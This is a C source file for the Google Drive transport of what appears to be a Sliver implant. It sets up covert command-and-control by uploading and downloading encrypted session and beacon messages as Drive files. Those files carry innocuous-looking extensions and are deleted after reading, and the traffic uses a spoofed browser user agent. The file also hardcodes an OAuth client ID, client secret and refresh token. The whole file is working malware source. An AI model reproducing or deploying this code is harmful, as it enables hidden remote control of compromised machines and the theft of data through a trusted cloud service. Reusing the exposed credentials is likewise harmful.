#include "pch.h"

BOOL RefreshAccessToken
(
	PSLIVER_DRIVE_CLIENT pDriveClient,
	PDRIVE_CONFIG pDriveConfig
)
{
	CHAR szOauthPath[] = "https://oauth2.googleapis.com/token";
	CHAR lpBody[0x400];
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pHttpResp = NULL;
	BOOL Result = FALSE;
	LPSTR lpResult = NULL;
	LPSTR lpContentTypeStr = NULL;

	SecureZeroMemory(lpBody, sizeof(lpBody));
	pHttpClient = HttpClientInit(UriInit(szOauthPath));
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	wsprintfA(lpBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
	pHttpResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
	if (pHttpResp == NULL) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pHttpResp->pRespData, "access_token\": \"", "\",\n");
	if (lpResult == NULL) {
		goto CLEANUP;
	}

	FREE(pDriveClient->pHttpConfig->lpAccessToken);
	pDriveClient->pHttpConfig->lpAccessToken = lpResult;
	Result = TRUE;
CLEANUP:
	FreeHttpResp(pHttpResp);
	FreeHttpClient(pHttpClient);
	FREE(lpContentTypeStr);

	return Result;
}

PSLIVER_DRIVE_CLIENT DriveInit()
{
	PSLIVER_DRIVE_CLIENT lpResult = NULL;
	PHTTP_REQUEST pHttpReq = NULL;

	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
	CHAR szClientSecret[] = "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";
	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
	DWORD i = 0;
	/*CHAR szRecvPrefix[] = "gocspx";
	CHAR szSendPrefix[] = "age52";*/
	CHAR szStartExtension[] = "coffee";
	CHAR szSendExtension[] = "vsx";
	CHAR szRecvExtension[] = "_sln160";
	CHAR szRegisterExtension[] = "vssettings";
	DWORD dwPollInterval = 120;

	lpResult = ALLOC(sizeof(SLIVER_DRIVE_CLIENT));
	lpResult->dwNumberOfDriveConfigs = 1;
	lpResult->dwPollInterval = dwPollInterval;
	lpResult->DriveList = ALLOC(sizeof(PDRIVE_CONFIG));
	for (i = 0; i < lpResult->dwNumberOfDriveConfigs; i++) {
		lpResult->DriveList[i] = ALLOC(sizeof(DRIVE_CONFIG));
	}

	lpResult->DriveList[0]->lpClientId = DuplicateStrA(szClientId, 0);
	lpResult->DriveList[0]->lpClientSecret = DuplicateStrA(szClientSecret, 0);
	lpResult->DriveList[0]->lpRefreshToken = DuplicateStrA(szRefreshToken, 0);
	lpResult->DriveList[0]->lpSendExtension = DuplicateStrA(szSendExtension, 0);
	lpResult->DriveList[0]->lpRecvExtension = DuplicateStrA(szRecvExtension, 0);
	lpResult->DriveList[0]->lpStartExtension = DuplicateStrA(szStartExtension, 0);
	lpResult->DriveList[0]->lpRegisterExtension = DuplicateStrA(szRegisterExtension, 0);
	lpResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
	lpResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
	lpResult->pHttpConfig->dwNumberOfAttemps = 10;

	return lpResult;
}

BOOL DriveStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	BOOL Result = FALSE;
	PBUFFER pSessionId = NULL;
	PBYTE pEncryptedSessionInit = NULL;
	DWORD cbEncryptedSessionInit = 0;
	PPBElement pMarshaledData = NULL;
	DWORD i = 0;
	CHAR szName[0x200];
	PDRIVE_CONFIG pDriveConfig = NULL;
	CHAR szMetadata[0x400];
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PBUFFER pRespData = NULL;
	CHAR szRespFileName[0x100];
	PBYTE pPublicKeyDigest = NULL;
	LPSTR lpPublicKeyHexDigest = NULL;
	DWORD dwNumberOfTries = 0;

	pMarshaledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
		goto CLEANUP;
	}

	pPublicKeyDigest = ComputeSHA256(pConfig->lpPeerPubKey, lstrlenA(pConfig->lpPeerPubKey));
	lpPublicKeyHexDigest = ConvertBytesToHexA(pPublicKeyDigest, 8);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	lpUniqueBoundary = GenRandomStr(16);
	lpBody = ALLOC(cbEncryptedSessionInit + 0x400);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
		pDriveConfig = pDriveClient->DriveList[i];
		if (pDriveConfig == NULL) {
			continue;
		}

		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
			continue;
		}

		SecureZeroMemory(szName, sizeof(szName));
		SecureZeroMemory(szMetadata, sizeof(szMetadata));
		SecureZeroMemory(lpBody, cbEncryptedSessionInit + 0x400);
		wsprintfA(szName, "Hello.%s", pDriveConfig->lpStartExtension);
		wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n", lpUniqueBoundary);
		cbBody += wsprintfA(&lpBody[cbBody], "%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", szMetadata, lpUniqueBoundary, szName);
		memcpy(&lpBody[cbBody], pEncryptedSessionInit, cbEncryptedSessionInit);
		cbBody += cbEncryptedSessionInit;
		cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
			FreeHttpResp(pResp);
			continue;
		}

		FreeHttpResp(pResp);
		pResp = NULL;
		SecureZeroMemory(szRespFileName, sizeof(szRespFileName));
		wsprintfA(szRespFileName, "%s.%s", lpPublicKeyHexDigest, pDriveConfig->lpStartExtension);
		while (dwNumberOfTries < pConfig->dwMaxFailure) {
			Sleep(pDriveClient->dwPollInterval * 1000);
			pRespData = DriveDownload(pDriveClient, szRespFileName);
			if (pRespData != NULL) {
				break;
			}

			dwNumberOfTries++;
		}

		if (pRespData == NULL) {
			continue;
		}

		pSessionId = SliverDecrypt(pConfig->pSessionKey, pRespData);
		memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
		Result = TRUE;
		break;
	}

CLEANUP:
	FreeHttpClient(pHttpClient);
	FREE(lpUniqueBoundary);
	FREE(lpBody);
	FREE(pEncryptedSessionInit);
	FREE(pPublicKeyDigest);
	FREE(lpPublicKeyHexDigest);
	FreeElement(pMarshaledData);
	FreeBuffer(pSessionId);
	FreeBuffer(pRespData);

	return Result;
}

BOOL DriveSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pMarshaledEnvelope = NULL;
	DWORD i = 0;
	CHAR szName[0x200];
	PDRIVE_CONFIG pDriveConfig = NULL;
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PBUFFER pCipherText = NULL;

	PrintFormatA("----------------------------------------------------\nSend Envelope:\n");
	HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	lpBody = ALLOC(pCipherText->cbBuffer + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, pCipherText->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			LOG_ERROR("VirtualAlloc", GetLastError());
			goto CLEANUP;
		}
	}

	lpUniqueBoundary = GenRandomStr(16);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
		pDriveConfig = pDriveClient->DriveList[i];
		if (pDriveConfig == NULL) {
			continue;
		}

		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
			continue;
		}

		SecureZeroMemory(szName, sizeof(szName));
		SecureZeroMemory(szMetadata, sizeof(szMetadata));
		SecureZeroMemory(lpBody, pCipherText->cbBuffer + 0x400);
		if (pEnvelope->uType == MsgBeaconRegister) {
			wsprintfA(szName, "%s_%d.%s", pConfig->szSessionID, pDriveClient->dwSendCounter, pDriveConfig->lpRegisterExtension);
		}
		else {
			wsprintfA(szName, "%s_%d.%s", pConfig->szSessionID, pDriveClient->dwSendCounter, pDriveConfig->lpSendExtension);
		}

		wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n", lpUniqueBoundary);
		cbBody += wsprintfA(&lpBody[cbBody], "%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", szMetadata, lpUniqueBoundary, szName);
		memcpy(&lpBody[cbBody], pCipherText->pBuffer, pCipherText->cbBuffer);
		cbBody += pCipherText->cbBuffer;
		cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
			FreeHttpResp(pResp);
			continue;
		}

		pDriveClient->dwSendCounter++;
		Result = TRUE;
		FreeHttpResp(pResp);
		break;
	}
	
CLEANUP:
	FreeHttpClient(pHttpClient);
	FREE(lpUniqueBoundary);
	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	FreeBuffer(pMarshaledEnvelope);
	FreeBuffer(pCipherText);
	return Result;
}

PENVELOPE DriveRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	PENVELOPE pResult = NULL;
	PDRIVE_CONFIG pDriveConfig = NULL;
	PBUFFER pRespData = NULL;
	PBUFFER pPlainText = NULL;
	LPSTR lpTempUri = NULL;
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;
	DWORD i = 0;
	LPSTR lpFileId = NULL;
	LPSTR SubStrings[2];

	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
		pDriveConfig = pDriveClient->DriveList[i];
		if (pDriveConfig == NULL) {
			continue;
		}

		FREE(lpFileId);
		SubStrings[0] = pConfig->szSessionID;
		SubStrings[1] = pDriveConfig->lpRecvExtension;
		lpFileId = GetFileId(pDriveClient, pDriveConfig, SubStrings, _countof(SubStrings));
		if (lpFileId == NULL) {
			continue;
		}

		FREE(lpTempUri);
		lpTempUri = DuplicateStrA(szUri, 0x40);
		wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
		if (pHttpClient != NULL) {
			FreeHttpClient(pHttpClient);
			pHttpClient = NULL;
		}

		FreeHttpClient(pHttpClient);
		pHttpClient = NULL;
		pUri = UriInit(lpTempUri);
		if (pUri == NULL) {
			continue;
		}

		pHttpClient = HttpClientInit(pUri);
		if (pHttpClient == NULL) {
			continue;
		}

		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
			continue;
		}

		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
		if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
			FreeHttpResp(pResp);
			continue;
		}

		pRespData = BufferMove(pResp->pRespData, pResp->cbResp);
		pResp->pRespData = NULL;
		pDriveClient->dwRecvCounter++;
		pPlainText = SliverDecrypt(pConfig->pSessionKey, pRespData);
		pResult = UnmarshalEnvelope(pPlainText);

		PrintFormatA("----------------------------------------------------\nReceive Envelope:\n");
		if (pResult->pData != NULL) {
			HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
		}
		else {
			PrintFormatA("NULL\n");
		}

		FreeHttpResp(pResp);
		DriveDelete(pDriveClient, pDriveConfig, lpFileId);
		break;
	}
	
CLEANUP:
	FreeBuffer(pRespData);
	FreeBuffer(pPlainText);
	FREE(lpTempUri);
	FREE(lpFileId);

	return pResult;
}

BOOL DriveClose
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
)
{
	return TRUE;
}

//BOOL DriveUpload
//(
//	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
//	_In_ PBYTE pData,
//	_In_ DWORD cbData,
//	_In_ DriveOperation Operaion
//)
//{
//	BOOL Result = FALSE;
//	CHAR szMetadata[0x400];
//	SYSTEMTIME SystemTime;
//	LPSTR lpBody = NULL;
//	DWORD cbBody = 0;
//	LPSTR lpUniqueBoundary = NULL;
//	BOOL NoHeapMemory = FALSE;
//	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
//	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
//	PURI pUri = NULL;
//	PHTTP_CLIENT pHttpClient = NULL;
//	PHTTP_RESP pResp = NULL;
//	PDRIVE_CONFIG pDriveConfig = NULL;
//	DWORD i = 0;
//
//	pUri = UriInit(szUrl);
//	if (pUri == NULL) {
//		goto CLEANUP;
//	}
//
//	pHttpClient = HttpClientInit(pUri);
//	if (pHttpClient == NULL) {
//		goto CLEANUP;
//	}
//
//	lpBody = ALLOC(cbData + 0x400);
//	if (lpBody == NULL) {
//		NoHeapMemory = TRUE;
//		lpBody = VirtualAlloc(NULL, cbData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//		if (lpBody == NULL) {
//			LOG_ERROR("VirtualAlloc", GetLastError());
//			goto CLEANUP;
//		}
//	}
//
//	SecureZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
//	GetSystemTime(&SystemTime);
//	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
//	lpUniqueBoundary = GenRandomStr(16);
//	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
//	memcpy(&lpBody[cbBody], pData, cbData);
//	cbBody += cbData;
//	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
//	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
//
//	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
//		pDriveConfig = pDriveClient->DriveList[i];
//		if (pDriveConfig == NULL) {
//			continue;
//		}
//
//		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
//			continue;
//		}
//		
//		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
//		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
//			FreeHttpResp(pResp);
//			continue;
//		}
//
//		FreeHttpResp(pResp);
//		break;
//	}
//	
//	Result = TRUE;
//CLEANUP:
//	FreeHttpClient(pHttpClient);
//	if (lpUniqueBoundary != NULL) {
//		FREE(lpUniqueBoundary);
//	}
//
//	if (lpBody != NULL) {
//		if (NoHeapMemory) {
//			VirtualFree(lpBody, 0, MEM_RELEASE);
//		}
//		else {
//			FREE(lpBody);
//		}
//	}
//
//	return Result;
//}

LPSTR GetFileId
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR* pSubStrings,
	_In_ DWORD cSubStrings
)
{
	DWORD cbResp = 0;
	LPSTR lpResult = NULL;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;
	LPSTR lpUri = NULL;
	DWORD i = 0;

	if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
		goto CLEANUP;
	}

	lpUri = DuplicateStrA("https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20", 0);
	for (i = 0; i < cSubStrings; i++) {
		lpUri = StrCatExA(lpUri, "name%20contains%20%27");
		lpUri = StrCatExA(lpUri, pSubStrings[i]);
		lpUri = StrCatExA(lpUri, "%27");
		if (i < cSubStrings - 1) {
			lpUri = StrCatExA(lpUri, "%20and%20");
		}
	}

	lpUri = StrCatExA(lpUri, "&fields=files(id,name)");
	pUri = UriInit(lpUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pResp->pRespData, "\"id\": \"", "\",\n");
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	FREE(lpUri);

	return lpResult;
}

BOOL DriveDelete
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR lpFileId
)
{
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	BOOL Result = FALSE;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
		goto CLEANUP;
	}

	lstrcatA(szUri, lpFileId);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "DELETE", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);

	return Result;
}

PBUFFER DriveDownload
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ LPSTR lpFileName
)
{
	LPSTR lpFileId = NULL;
	DWORD i = 0;
	PDRIVE_CONFIG pDriveConfig = NULL;
	LPSTR lpTempUri = NULL;
	PURI pUri = NULL;
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PBUFFER pResult = NULL;

	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
		pDriveConfig = pDriveClient->DriveList[i];
		if (pDriveConfig == NULL) {
			continue;
		}

		FREE(lpFileId);
		lpFileId = GetFileId(pDriveClient, pDriveConfig, &lpFileName, 1);
		if (lpFileId == NULL) {
			continue;
		}

		FREE(lpTempUri);
		lpTempUri = DuplicateStrA(szUri, 0x40);
		wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
		if (pHttpClient != NULL) {
			FreeHttpClient(pHttpClient);
			pHttpClient = NULL;
		}
		
		FreeHttpClient(pHttpClient);
		pHttpClient = NULL;
		pUri = UriInit(lpTempUri);
		if (pUri == NULL) {
			continue;
		}

		pHttpClient = HttpClientInit(pUri);
		if (pHttpClient == NULL) {
			continue;
		}

		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
			continue;
		}

		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
		if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
			FreeHttpResp(pResp);
			continue;
		}

		pResult = BufferMove(pResp->pRespData, pResp->cbResp);
		pResp->pRespData = NULL;
		FreeHttpResp(pResp);
		DriveDelete(pDriveClient, pDriveConfig, lpFileId);
		break;
	}
CLEANUP:
	FREE(lpFileId);
	FreeHttpClient(pHttpClient);

	return pResult;
}

BOOL FreeDriveClient
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	DWORD i = 0;
	PDRIVE_CONFIG pDriveConfig = NULL;

	if (pDriveClient != NULL) {
		for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
			pDriveConfig = pDriveClient->DriveList[i];
			if (pDriveConfig == NULL) {
				continue;
			}

			FREE(pDriveConfig->lpClientId);
			FREE(pDriveConfig->lpClientSecret);
			FREE(pDriveConfig->lpRefreshToken);
			FREE(pDriveConfig->lpSendExtension);
			FREE(pDriveConfig->lpRegisterExtension);
			FREE(pDriveConfig->lpRecvExtension);
			FREE(pDriveConfig->lpStartExtension);
			FREE(pDriveConfig);
			pDriveClient->DriveList[i] = NULL;
		}

		if (pDriveClient->pHttpConfig != NULL) {
			FREE(pDriveClient->pHttpConfig->lpUserAgent);
			FREE(pDriveClient->pHttpConfig->lpAccessToken);

			for (i = 0; i < _countof(pDriveClient->pHttpConfig->AdditionalHeaders); i++) {
				FREE(pDriveClient->pHttpConfig->AdditionalHeaders[i]);
			}

			FREE(pDriveClient->pHttpConfig);
		}

		FREE(pDriveClient);
	}

	return TRUE;
}